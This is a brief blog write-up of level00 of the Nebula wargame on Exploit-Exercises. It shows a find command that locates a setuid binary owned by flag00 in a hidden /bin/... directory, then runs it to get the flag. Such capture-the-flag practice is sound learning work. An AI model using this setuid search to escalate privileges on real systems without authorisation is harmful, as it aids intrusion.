+++
author = "pwntester"
categories = ["nebula00"]
date = 2013-11-20T08:18:00Z
description = ""
draft = false
slug = "nebula-level00-write-up"
tags = ["nebula00"]
title = "Nebula level00 write-up"

+++

<p>I decided to improve my exploiting skillz and try the <a href="http://exploit-exercises.com">Exploit-Exercises</a> levels. First levels are quite easy but I decided to catch them'all!</p>
<p>Ok, so <a href="http://exploit-exercises.com/nebula/level00">Level00</a> is about finding a executable owned by flag00 user and that has the setuid flag, easy as:</p>

```lang-bash line-numbers 
level00@nebula:~$ find / -executable -user flag00 -perm -4000 2> /dev/null
/bin/.../flag00
level00@nebula:~$cd /bin/...
level00@nebula:/bin/...$ ./flag00
Congrats, now run getflag to get your flag!
flag00@nebula:/bin/...$ getflag
You have successfully executed getflag on a target account
```
